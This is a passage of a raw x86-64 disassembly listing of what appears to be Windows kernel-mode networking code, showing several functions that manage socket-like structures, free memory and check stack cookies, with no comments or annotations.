   1276a:	41 3b ff             	cmp    %r15d,%edi
   1276d:	0f 83 8d 00 00 00    	jae    0x12800
   12773:	48 8d 15 66 23 00 00 	lea    0x2366(%rip),%rdx        # 0x14ae0
   1277a:	48 8b ce             	mov    %rsi,%rcx
   1277d:	ff 15 e5 28 00 00    	call   *0x28e5(%rip)        # 0x15068
   12783:	48 8b d0             	mov    %rax,%rdx
   12786:	48 85 c0             	test   %rax,%rax
   12789:	74 bf                	je     0x1274a
   1278b:	48 83 c2 04          	add    $0x4,%rdx
   1278f:	74 6f                	je     0x12800
   12791:	48 3b d6             	cmp    %rsi,%rdx
   12794:	72 6a                	jb     0x12800
   12796:	49 3b d6             	cmp    %r14,%rdx
   12799:	73 65                	jae    0x12800
   1279b:	8b c6                	mov    %esi,%eax
   1279d:	2b c2                	sub    %edx,%eax
   1279f:	03 f8                	add    %eax,%edi
   127a1:	41 3b fd             	cmp    %r13d,%edi
   127a4:	77 5a                	ja     0x12800
   127a6:	48 8d 04 17          	lea    (%rdi,%rdx,1),%rax
   127aa:	44 8b c7             	mov    %edi,%r8d
   127ad:	49 3b c6             	cmp    %r14,%rax
   127b0:	77 4e                	ja     0x12800
   127b2:	85 ff                	test   %edi,%edi
   127b4:	74 08                	je     0x127be
   127b6:	49 8b cc             	mov    %r12,%rcx
   127b9:	e8 82 1b 00 00       	call   0x14340
   127be:	41 3b fd             	cmp    %r13d,%edi
   127c1:	73 67                	jae    0x1282a
   127c3:	45 33 c9             	xor    %r9d,%r9d
   127c6:	45 8b c7             	mov    %r15d,%r8d
   127c9:	48 8b d6             	mov    %rsi,%rdx
   127cc:	48 8b cb             	mov    %rbx,%rcx
   127cf:	e8 74 04 00 00       	call   0x12c48
   127d4:	85 c0                	test   %eax,%eax
   127d6:	7e 46                	jle    0x1281e
   127d8:	44 8d 34 07          	lea    (%rdi,%rax,1),%r14d
   127dc:	45 3b f5             	cmp    %r13d,%r14d
   127df:	77 3d                	ja     0x1281e
   127e1:	41 3b c7             	cmp    %r15d,%eax
   127e4:	7f 38                	jg     0x1281e
   127e6:	8b cf                	mov    %edi,%ecx
   127e8:	4c 63 c0             	movslq %eax,%r8
   127eb:	48 8b d6             	mov    %rsi,%rdx
   127ee:	49 03 cc             	add    %r12,%rcx
   127f1:	e8 4a 1b 00 00       	call   0x14340
   127f6:	41 8b fe             	mov    %r14d,%edi
   127f9:	45 3b f5             	cmp    %r13d,%r14d
   127fc:	72 c5                	jb     0x127c3
   127fe:	eb 2a                	jmp    0x1282a
   12800:	33 d2                	xor    %edx,%edx
   12802:	48 8b cd             	mov    %rbp,%rcx
   12805:	ff 15 55 28 00 00    	call   *0x2855(%rip)        # 0x15060
   1280b:	33 d2                	xor    %edx,%edx
   1280d:	48 8b ce             	mov    %rsi,%rcx
   12810:	ff 15 4a 28 00 00    	call   *0x284a(%rip)        # 0x15060
   12816:	49 8b cc             	mov    %r12,%rcx
   12819:	e9 90 fc ff ff       	jmp    0x124ae
   1281e:	48 8b cb             	mov    %rbx,%rcx
   12821:	e8 6e 01 00 00       	call   0x12994
   12826:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1282a:	33 d2                	xor    %edx,%edx
   1282c:	48 8b cd             	mov    %rbp,%rcx
   1282f:	ff 15 2b 28 00 00    	call   *0x282b(%rip)        # 0x15060
   12835:	33 d2                	xor    %edx,%edx
   12837:	48 8b ce             	mov    %rsi,%rcx
   1283a:	ff 15 20 28 00 00    	call   *0x2820(%rip)        # 0x15060
   12840:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   12844:	74 08                	je     0x1284e
   12846:	48 8b cb             	mov    %rbx,%rcx
   12849:	e8 46 01 00 00       	call   0x12994
   1284e:	80 7c 24 30 01       	cmpb   $0x1,0x30(%rsp)
   12853:	75 0a                	jne    0x1285f
   12855:	41 3b fd             	cmp    %r13d,%edi
   12858:	74 05                	je     0x1285f
   1285a:	49 8b cc             	mov    %r12,%rcx
   1285d:	eb 1a                	jmp    0x12879
   1285f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   12864:	89 38                	mov    %edi,(%rax)
   12866:	49 8b c4             	mov    %r12,%rax
   12869:	eb 18                	jmp    0x12883
   1286b:	33 d2                	xor    %edx,%edx
   1286d:	48 8b cd             	mov    %rbp,%rcx
   12870:	ff 15 ea 27 00 00    	call   *0x27ea(%rip)        # 0x15060
   12876:	48 8b ce             	mov    %rsi,%rcx
   12879:	33 d2                	xor    %edx,%edx
   1287b:	ff 15 df 27 00 00    	call   *0x27df(%rip)        # 0x15060
   12881:	33 c0                	xor    %eax,%eax
   12883:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   12888:	48 33 cc             	xor    %rsp,%rcx
   1288b:	e8 30 19 00 00       	call   0x141c0
   12890:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   12897:	00 
   12898:	48 83 c4 60          	add    $0x60,%rsp
   1289c:	41 5f                	pop    %r15
   1289e:	41 5e                	pop    %r14
   128a0:	41 5d                	pop    %r13
   128a2:	41 5c                	pop    %r12
   128a4:	5f                   	pop    %rdi
   128a5:	5e                   	pop    %rsi
   128a6:	5d                   	pop    %rbp
   128a7:	c3                   	ret
   128a8:	cc                   	int3
   128a9:	cc                   	int3
   128aa:	cc                   	int3
   128ab:	cc                   	int3
   128ac:	cc                   	int3
   128ad:	cc                   	int3
   128ae:	cc                   	int3
   128af:	cc                   	int3
   128b0:	48 83 ec 28          	sub    $0x28,%rsp
   128b4:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   128b8:	45 33 c0             	xor    %r8d,%r8d
   128bb:	33 d2                	xor    %edx,%edx
   128bd:	ff 15 4d 28 00 00    	call   *0x284d(%rip)        # 0x15110
   128c3:	33 c0                	xor    %eax,%eax
   128c5:	48 83 c4 28          	add    $0x28,%rsp
   128c9:	c3                   	ret
   128ca:	cc                   	int3
   128cb:	cc                   	int3
   128cc:	cc                   	int3
   128cd:	cc                   	int3
   128ce:	cc                   	int3
   128cf:	cc                   	int3
   128d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   128d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   128da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   128df:	57                   	push   %rdi
   128e0:	48 83 ec 40          	sub    $0x40,%rsp
   128e4:	48 8b da             	mov    %rdx,%rbx
   128e7:	48 8b f1             	mov    %rcx,%rsi
   128ea:	48 85 c9             	test   %rcx,%rcx
   128ed:	0f 84 80 00 00 00    	je     0x12973
   128f3:	83 3a 02             	cmpl   $0x2,(%rdx)
   128f6:	75 09                	jne    0x12901
   128f8:	48 8d 15 11 22 00 00 	lea    0x2211(%rip),%rdx        # 0x14b10
   128ff:	eb 0c                	jmp    0x1290d
   12901:	83 3a 01             	cmpl   $0x1,(%rdx)
   12904:	75 6d                	jne    0x12973
   12906:	48 8d 15 e3 21 00 00 	lea    0x21e3(%rip),%rdx        # 0x14af0
   1290d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   12912:	ff 15 f0 26 00 00    	call   *0x26f0(%rip)        # 0x15008
   12918:	44 8a 4b 08          	mov    0x8(%rbx),%r9b
   1291c:	44 0f b7 46 02       	movzwl 0x2(%rsi),%r8d
   12921:	8b 56 04             	mov    0x4(%rsi),%edx
   12924:	48 8d 7b 18          	lea    0x18(%rbx),%rdi
   12928:	48 8d 6b 10          	lea    0x10(%rbx),%rbp
   1292c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   12931:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   12936:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1293b:	e8 e4 06 00 00       	call   0x13024
   12940:	85 c0                	test   %eax,%eax
   12942:	79 0b                	jns    0x1294f
   12944:	48 83 27 00          	andq   $0x0,(%rdi)
   12948:	48 83 4d 00 ff       	orq    $0xffffffffffffffff,0x0(%rbp)
   1294d:	eb 27                	jmp    0x12976
   1294f:	83 3b 01             	cmpl   $0x1,(%rbx)
   12952:	75 17                	jne    0x1296b
   12954:	48 8b 0f             	mov    (%rdi),%rcx
   12957:	4c 8d 05 52 ff ff ff 	lea    -0xae(%rip),%r8        # 0x128b0
   1295e:	4c 8b cb             	mov    %rbx,%r9
   12961:	ba 01 00 00 00       	mov    $0x1,%edx
   12966:	e8 9d 09 00 00       	call   0x13308
   1296b:	c6 43 04 01          	movb   $0x1,0x4(%rbx)
   1296f:	33 c0                	xor    %eax,%eax
   12971:	eb 03                	jmp    0x12976
   12973:	83 c8 ff             	or     $0xffffffff,%eax
   12976:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1297b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   12980:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   12985:	48 83 c4 40          	add    $0x40,%rsp
   12989:	5f                   	pop    %rdi
   1298a:	c3                   	ret
   1298b:	cc                   	int3
   1298c:	cc                   	int3
   1298d:	cc                   	int3
   1298e:	cc                   	int3
   1298f:	cc                   	int3
   12990:	cc                   	int3
   12991:	cc                   	int3
   12992:	cc                   	int3
   12993:	cc                   	int3
   12994:	40 53                	rex push %rbx
   12996:	48 83 ec 20          	sub    $0x20,%rsp
   1299a:	48 8b d9             	mov    %rcx,%rbx
   1299d:	48 f7 db             	neg    %rbx
   129a0:	80 7b 04 00          	cmpb   $0x0,0x4(%rbx)
   129a4:	0f 84 8b 00 00 00    	je     0x12a35
   129aa:	83 3b 01             	cmpl   $0x1,(%rbx)
   129ad:	75 62                	jne    0x12a11
   129af:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   129b3:	48 85 c9             	test   %rcx,%rcx
   129b6:	74 59                	je     0x12a11
   129b8:	80 7b 05 00          	cmpb   $0x0,0x5(%rbx)
   129bc:	74 14                	je     0x129d2
   129be:	80 7b 07 00          	cmpb   $0x0,0x7(%rbx)
   129c2:	75 0e                	jne    0x129d2
   129c4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   129c8:	ba 04 00 00 00       	mov    $0x4,%edx
   129cd:	e8 a2 0d 00 00       	call   0x13774
   129d2:	48 8b 43 20          	mov    0x20(%rbx),%rax
   129d6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   129da:	48 85 c9             	test   %rcx,%rcx
   129dd:	74 13                	je     0x129f2
   129df:	e8 18 0b 00 00       	call   0x134fc
   129e4:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   129e8:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   129ec:	ff 15 be 26 00 00    	call   *0x26be(%rip)        # 0x150b0
   129f2:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   129f6:	48 83 39 ff          	cmpq   $0xffffffffffffffff,(%rcx)
   129fa:	74 09                	je     0x12a05
   129fc:	48 8b 09             	mov    (%rcx),%rcx
   129ff:	ff 15 2b 26 00 00    	call   *0x262b(%rip)        # 0x15030
   12a05:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12a09:	33 d2                	xor    %edx,%edx
   12a0b:	ff 15 4f 26 00 00    	call   *0x264f(%rip)        # 0x15060
   12a11:	83 3b 02             	cmpl   $0x2,(%rbx)
   12a14:	74 05                	je     0x12a1b
   12a16:	83 3b 01             	cmpl   $0x1,(%rbx)
   12a19:	75 1a                	jne    0x12a35
   12a1b:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   12a1f:	ff 15 8b 26 00 00    	call   *0x268b(%rip)        # 0x150b0
   12a25:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   12a29:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   12a2d:	74 06                	je     0x12a35
   12a2f:	ff 15 fb 25 00 00    	call   *0x25fb(%rip)        # 0x15030
   12a35:	33 d2                	xor    %edx,%edx
   12a37:	48 8b cb             	mov    %rbx,%rcx
   12a3a:	ff 15 20 26 00 00    	call   *0x2620(%rip)        # 0x15060
   12a40:	33 c0                	xor    %eax,%eax
   12a42:	48 83 c4 20          	add    $0x20,%rsp
   12a46:	5b                   	pop    %rbx
   12a47:	c3                   	ret
   12a48:	cc                   	int3
   12a49:	cc                   	int3
   12a4a:	cc                   	int3
   12a4b:	cc                   	int3
   12a4c:	cc                   	int3
   12a4d:	cc                   	int3
   12a4e:	cc                   	int3
   12a4f:	cc                   	int3
   12a50:	4c 8b dc             	mov    %rsp,%r11
   12a53:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   12a57:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   12a5b:	56                   	push   %rsi
   12a5c:	57                   	push   %rdi
   12a5d:	41 54                	push   %r12
   12a5f:	48 83 ec 60          	sub    $0x60,%rsp
   12a63:	48 8b 05 96 36 00 00 	mov    0x3696(%rip),%rax        # 0x16100
   12a6a:	48 33 c4             	xor    %rsp,%rax
   12a6d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   12a72:	48 8b d9             	mov    %rcx,%rbx
   12a75:	45 33 e4             	xor    %r12d,%r12d
   12a78:	48 8b f2             	mov    %rdx,%rsi
   12a7b:	48 f7 db             	neg    %rbx
   12a7e:	49 3b d4             	cmp    %r12,%rdx
   12a81:	0f 84 94 01 00 00    	je     0x12c1b
   12a87:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   12a8b:	41 8d 6c 24 02       	lea    0x2(%r12),%ebp
   12a90:	44 38 63 04          	cmp    %r12b,0x4(%rbx)
   12a94:	75 23                	jne    0x12ab9
   12a96:	66 89 6c 24 40       	mov    %bp,0x40(%rsp)
   12a9b:	49 8d 4b c8          	lea    -0x38(%r11),%rcx
   12a9f:	48 8b d3             	mov    %rbx,%rdx
   12aa2:	66 45 89 63 ca       	mov    %r12w,-0x36(%r11)
   12aa7:	45 89 63 cc          	mov    %r12d,-0x34(%r11)
   12aab:	e8 20 fe ff ff       	call   0x128d0
   12ab0:	41 3b c4             	cmp    %r12d,%eax
   12ab3:	0f 8c 65 01 00 00    	jl     0x12c1e
   12ab9:	83 3b 01             	cmpl   $0x1,(%rbx)
   12abc:	0f 85 39 01 00 00    	jne    0x12bfb
   12ac2:	44 38 63 05          	cmp    %r12b,0x5(%rbx)
   12ac6:	0f 85 2b 01 00 00    	jne    0x12bf7
   12acc:	44 38 63 06          	cmp    %r12b,0x6(%rbx)
   12ad0:	0f 85 21 01 00 00    	jne    0x12bf7
   12ad6:	4c 39 63 20          	cmp    %r12,0x20(%rbx)
   12ada:	75 4a                	jne    0x12b26
   12adc:	bd 28 00 00 00       	mov    $0x28,%ebp
   12ae1:	33 c9                	xor    %ecx,%ecx
   12ae3:	48 8b d5             	mov    %rbp,%rdx
   12ae6:	ff 15 3c 25 00 00    	call   *0x253c(%rip)        # 0x15028
   12aec:	48 89 43 20          	mov    %rax,0x20(%rbx)
   12af0:	49 3b c4             	cmp    %r12,%rax
   12af3:	75 0a                	jne    0x12aff
   12af5:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   12afa:	e9 1f 01 00 00       	jmp    0x12c1e
   12aff:	4c 8b c5             	mov    %rbp,%r8
   12b02:	33 d2                	xor    %edx,%edx
   12b04:	48 8b c8             	mov    %rax,%rcx
   12b07:	e8 34 17 00 00       	call   0x14240
   12b0c:	4c 8b 5b 20          	mov    0x20(%rbx),%r11
   12b10:	45 33 c0             	xor    %r8d,%r8d
   12b13:	49 89 3b             	mov    %rdi,(%r11)
   12b16:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12b1a:	33 d2                	xor    %edx,%edx
   12b1c:	48 83 c1 10          	add    $0x10,%rcx
   12b20:	ff 15 f2 25 00 00    	call   *0x25f2(%rip)        # 0x15118
   12b26:	48 8d 15 c3 1f 00 00 	lea    0x1fc3(%rip),%rdx        # 0x14af0
   12b2d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   12b32:	ff 15 d0 24 00 00    	call   *0x24d0(%rip)        # 0x15008
   12b38:	48 8b 53 20          	mov    0x20(%rbx),%rdx
   12b3c:	44 8a 43 08          	mov    0x8(%rbx),%r8b
   12b40:	48 8d 42 08          	lea    0x8(%rdx),%rax
   12b44:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   12b49:	4c 8b ca             	mov    %rdx,%r9
   12b4c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   12b51:	e8 56 06 00 00       	call   0x131ac
   12b56:	41 3b c4             	cmp    %r12d,%eax
   12b59:	44 8b d8             	mov    %eax,%r11d
   12b5c:	7d 17                	jge    0x12b75
   12b5e:	48 8b 43 20          	mov    0x20(%rbx),%rax
   12b62:	4c 89 60 08          	mov    %r12,0x8(%rax)
   12b66:	48 8b 43 20          	mov    0x20(%rbx),%rax
   12b6a:	48 89 38             	mov    %rdi,(%rax)
   12b6d:	41 8b c3             	mov    %r11d,%eax
   12b70:	e9 a9 00 00 00       	jmp    0x12c1e
   12b75:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12b79:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   12b7d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12b81:	e8 86 08 00 00       	call   0x1340c
   12b86:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12b8a:	41 3b c4             	cmp    %r12d,%eax
   12b8d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12b91:	8b e8                	mov    %eax,%ebp
   12b93:	7d 26                	jge    0x12bbb
   12b95:	ff 15 15 25 00 00    	call   *0x2515(%rip)        # 0x150b0
   12b9b:	4c 8b 5b 20          	mov    0x20(%rbx),%r11
   12b9f:	4d 89 63 08          	mov    %r12,0x8(%r11)
   12ba3:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12ba7:	48 8b 09             	mov    (%rcx),%rcx
   12baa:	ff 15 80 24 00 00    	call   *0x2480(%rip)        # 0x15030
   12bb0:	4c 8b 5b 20          	mov    0x20(%rbx),%r11
   12bb4:	8b c5                	mov    %ebp,%eax
   12bb6:	49 89 3b             	mov    %rdi,(%r11)
   12bb9:	eb 63                	jmp    0x12c1e
   12bbb:	44 0f b7 46 02       	movzwl 0x2(%rsi),%r8d
   12bc0:	8b 56 04             	mov    0x4(%rsi),%edx
   12bc3:	e8 14 0a 00 00       	call   0x135dc
   12bc8:	41 3b c4             	cmp    %r12d,%eax
   12bcb:	8b e8                	mov    %eax,%ebp
   12bcd:	7d 17                	jge    0x12be6
   12bcf:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12bd3:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12bd7:	e8 20 09 00 00       	call   0x134fc
   12bdc:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   12be0:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12be4:	eb af                	jmp    0x12b95
   12be6:	f3 0f 6f 06          	movdqu (%rsi),%xmm0
   12bea:	f3 0f 7f 43 28       	movdqu %xmm0,0x28(%rbx)
   12bef:	c6 43 05 01          	movb   $0x1,0x5(%rbx)
   12bf3:	33 c0                	xor    %eax,%eax
   12bf5:	eb 27                	jmp    0x12c1e
   12bf7:	8b c7                	mov    %edi,%eax
   12bf9:	eb 23                	jmp    0x12c1e
   12bfb:	39 2b                	cmp    %ebp,(%rbx)
   12bfd:	75 f8                	jne    0x12bf7
   12bff:	f3 0f 6f 06          	movdqu (%rsi),%xmm0
   12c03:	f3 0f 7f 43 28       	movdqu %xmm0,0x28(%rbx)
   12c08:	44 39 66 04          	cmp    %r12d,0x4(%rsi)
   12c0c:	75 e1                	jne    0x12bef
   12c0e:	66 44 39 66 02       	cmp    %r12w,0x2(%rsi)
   12c13:	75 da                	jne    0x12bef
   12c15:	44 88 63 05          	mov    %r12b,0x5(%rbx)
   12c19:	eb d8                	jmp    0x12bf3
   12c1b:	83 c8 ff             	or     $0xffffffff,%eax
   12c1e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   12c23:	48 33 cc             	xor    %rsp,%rcx
   12c26:	e8 95 15 00 00       	call   0x141c0
   12c2b:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   12c30:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   12c34:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   12c38:	49 8b e3             	mov    %r11,%rsp
   12c3b:	41 5c                	pop    %r12
   12c3d:	5f                   	pop    %rdi
   12c3e:	5e                   	pop    %rsi
   12c3f:	c3                   	ret
   12c40:	cc                   	int3
   12c41:	cc                   	int3
   12c42:	cc                   	int3
   12c43:	cc                   	int3
   12c44:	cc                   	int3
   12c45:	cc                   	int3
   12c46:	cc                   	int3
   12c47:	cc                   	int3
   12c48:	48 83 ec 38          	sub    $0x38,%rsp
   12c4c:	48 8b c1             	mov    %rcx,%rax
   12c4f:	48 f7 d9             	neg    %rcx
   12c52:	45 8b d1             	mov    %r9d,%r10d
   12c55:	83 39 02             	cmpl   $0x2,(%rcx)
   12c58:	75 16                	jne    0x12c70
   12c5a:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   12c60:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   12c66:	48 8b c8             	mov    %rax,%rcx
   12c69:	e8 3e 00 00 00       	call   0x12cac
   12c6e:	eb 2e                	jmp    0x12c9e
   12c70:	83 39 01             	cmpl   $0x1,(%rcx)
   12c73:	75 26                	jne    0x12c9b
   12c75:	80 79 05 00          	cmpb   $0x0,0x5(%rcx)
   12c79:	74 20                	je     0x12c9b
   12c7b:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   12c7f:	b8 40 00 00 00       	mov    $0x40,%eax
   12c84:	41 83 fa 01          	cmp    $0x1,%r10d
   12c88:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12c8c:	44 8d 48 e0          	lea    -0x20(%rax),%r9d
   12c90:	44 0f 44 c8          	cmove  %eax,%r9d
   12c94:	e8 3b 13 00 00       	call   0x13fd4
   12c99:	eb 03                	jmp    0x12c9e
   12c9b:	83 c8 ff             	or     $0xffffffff,%eax
   12c9e:	48 83 c4 38          	add    $0x38,%rsp
   12ca2:	c3                   	ret
   12ca3:	cc                   	int3
   12ca4:	cc                   	int3
   12ca5:	cc                   	int3
   12ca6:	cc                   	int3
   12ca7:	cc                   	int3
   12ca8:	cc                   	int3
   12ca9:	cc                   	int3
   12caa:	cc                   	int3
   12cab:	cc                   	int3
   12cac:	48 83 ec 38          	sub    $0x38,%rsp
   12cb0:	48 8b c1             	mov    %rcx,%rax
   12cb3:	48 f7 d9             	neg    %rcx
   12cb6:	45 8b d0             	mov    %r8d,%r10d
   12cb9:	83 39 01             	cmpl   $0x1,(%rcx)
   12cbc:	4c 8b da             	mov    %rdx,%r11
   12cbf:	75 0a                	jne    0x12ccb
   12cc1:	48 8b c8             	mov    %rax,%rcx
   12cc4:	e8 7f ff ff ff       	call   0x12c48
   12cc9:	eb 56                	jmp    0x12d21
   12ccb:	83 39 02             	cmpl   $0x2,(%rcx)
   12cce:	75 4e                	jne    0x12d1e
   12cd0:	33 d2                	xor    %edx,%edx
   12cd2:	4c 8b c2             	mov    %rdx,%r8
   12cd5:	38 51 04             	cmp    %dl,0x4(%rcx)
   12cd8:	74 44                	je     0x12d1e
   12cda:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   12cdf:	48 3b c2             	cmp    %rdx,%rax
   12ce2:	74 1f                	je     0x12d03
   12ce4:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   12ce9:	4c 3b ca             	cmp    %rdx,%r9
   12cec:	74 15                	je     0x12d03
   12cee:	41 83 39 10          	cmpl   $0x10,(%r9)
   12cf2:	72 0f                	jb     0x12d03
   12cf4:	48 8d 50 04          	lea    0x4(%rax),%rdx
   12cf8:	4c 8d 40 02          	lea    0x2(%rax),%r8
   12cfc:	41 c7 01 10 00 00 00 	movl   $0x10,(%r9)
   12d03:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   12d07:	4d 8b cb             	mov    %r11,%r9
   12d0a:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   12d11:	00 
   12d12:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   12d17:	e8 d0 0d 00 00       	call   0x13aec
   12d1c:	eb 03                	jmp    0x12d21
   12d1e:	83 c8 ff             	or     $0xffffffff,%eax
   12d21:	48 83 c4 38          	add    $0x38,%rsp
   12d25:	c3                   	ret
   12d26:	cc                   	int3
   12d27:	cc                   	int3
   12d28:	cc                   	int3
   12d29:	cc                   	int3
   12d2a:	cc                   	int3
   12d2b:	cc                   	int3
   12d2c:	48 83 ec 38          	sub    $0x38,%rsp
   12d30:	4c 8b d1             	mov    %rcx,%r10
   12d33:	45 8b d9             	mov    %r9d,%r11d
   12d36:	48 f7 d9             	neg    %rcx
   12d39:	45 33 c9             	xor    %r9d,%r9d
   12d3c:	44 38 49 05          	cmp    %r9b,0x5(%rcx)
   12d40:	74 44                	je     0x12d86
   12d42:	83 39 02             	cmpl   $0x2,(%rcx)
   12d45:	75 1e                	jne    0x12d65
   12d47:	48 8d 41 28          	lea    0x28(%rcx),%rax
   12d4b:	45 8b cb             	mov    %r11d,%r9d
   12d4e:	49 8b ca             	mov    %r10,%rcx
   12d51:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   12d58:	00 
   12d59:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   12d5e:	e8 31 00 00 00       	call   0x12d94
   12d63:	eb 24                	jmp    0x12d89
   12d65:	83 39 01             	cmpl   $0x1,(%rcx)
   12d68:	75 1c                	jne    0x12d86
   12d6a:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   12d6e:	b8 20 00 00 00       	mov    $0x20,%eax
   12d73:	41 83 fb 01          	cmp    $0x1,%r11d
   12d77:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   12d7b:	44 0f 44 c8          	cmove  %eax,%r9d
   12d7f:	e8 78 10 00 00       	call   0x13dfc
   12d84:	eb 03                	jmp    0x12d89
   12d86:	83 c8 ff             	or     $0xffffffff,%eax
   12d89:	48 83 c4 38          	add    $0x38,%rsp
   12d8d:	c3                   	ret
   12d8e:	cc                   	int3
   12d8f:	cc                   	int3
   12d90:	cc                   	int3
   12d91:	cc                   	int3
   12d92:	cc                   	int3
   12d93:	cc                   	int3
   12d94:	40 53                	rex push %rbx
   12d96:	55                   	push   %rbp
   12d97:	56                   	push   %rsi
   12d98:	57                   	push   %rdi
   12d99:	41 54                	push   %r12
   12d9b:	48 83 ec 50          	sub    $0x50,%rsp
   12d9f:	48 8b 05 5a 33 00 00 	mov    0x335a(%rip),%rax        # 0x16100
   12da6:	48 33 c4             	xor    %rsp,%rax
   12da9:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   12dae:	48 8b d9             	mov    %rcx,%rbx
   12db1:	41 8b e8             	mov    %r8d,%ebp
   12db4:	48 8b f2             	mov    %rdx,%rsi
   12db7:	48 f7 db             	neg    %rbx
   12dba:	83 3b 01             	cmpl   $0x1,(%rbx)
   12dbd:	75 07                	jne    0x12dc6
   12dbf:	e8 68 ff ff ff       	call   0x12d2c
   12dc4:	eb 68                	jmp    0x12e2e
   12dc6:	b8 02 00 00 00       	mov    $0x2,%eax
   12dcb:	39 03                	cmp    %eax,(%rbx)
   12dcd:	75 5c                	jne    0x12e2b
   12dcf:	48 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%rdi
   12dd6:	00 
   12dd7:	45 33 e4             	xor    %r12d,%r12d
   12dda:	49 3b fc             	cmp    %r12,%rdi
   12ddd:	74 4c                	je     0x12e2b
   12ddf:	83 bc 24 a8 00 00 00 	cmpl   $0x10,0xa8(%rsp)
   12de6:	10 
   12de7:	72 42                	jb     0x12e2b
   12de9:	44 38 63 04          	cmp    %r12b,0x4(%rbx)
   12ded:	75 22                	jne    0x12e11
   12def:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   12df4:	48 8b d3             	mov    %rbx,%rdx
   12df7:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   12dfc:	66 44 89 64 24 32    	mov    %r12w,0x32(%rsp)
   12e02:	44 89 64 24 34       	mov    %r12d,0x34(%rsp)
   12e07:	e8 c4 fa ff ff       	call   0x128d0
   12e0c:	41 3b c4             	cmp    %r12d,%eax
   12e0f:	7c 1d                	jl     0x12e2e
   12e11:	44 0f b7 47 02       	movzwl 0x2(%rdi),%r8d
   12e16:	8b 57 04             	mov    0x4(%rdi),%edx
   12e19:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   12e1d:	4c 8b ce             	mov    %rsi,%r9
   12e20:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   12e24:	e8 43 0a 00 00       	call   0x1386c
   12e29:	eb 03                	jmp    0x12e2e
   12e2b:	83 c8 ff             	or     $0xffffffff,%eax
   12e2e:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   12e33:	48 33 cc             	xor    %rsp,%rcx
   12e36:	e8 85 13 00 00       	call   0x141c0
   12e3b:	48 83 c4 50          	add    $0x50,%rsp
   12e3f:	41 5c                	pop    %r12
   12e41:	5f                   	pop    %rdi
   12e42:	5e                   	pop    %rsi
   12e43:	5d                   	pop    %rbp
   12e44:	5b                   	pop    %rbx
   12e45:	c3                   	ret
   12e46:	cc                   	int3
   12e47:	cc                   	int3
   12e48:	cc                   	int3
   12e49:	cc                   	int3
   12e4a:	cc                   	int3
   12e4b:	cc                   	int3
   12e4c:	48 8b c4             	mov    %rsp,%rax
   12e4f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   12e53:	48 89 68 10          	mov    %rbp,0x10(%rax)
   12e57:	48 89 70 18          	mov    %rsi,0x18(%rax)
   12e5b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   12e5f:	41 54                	push   %r12
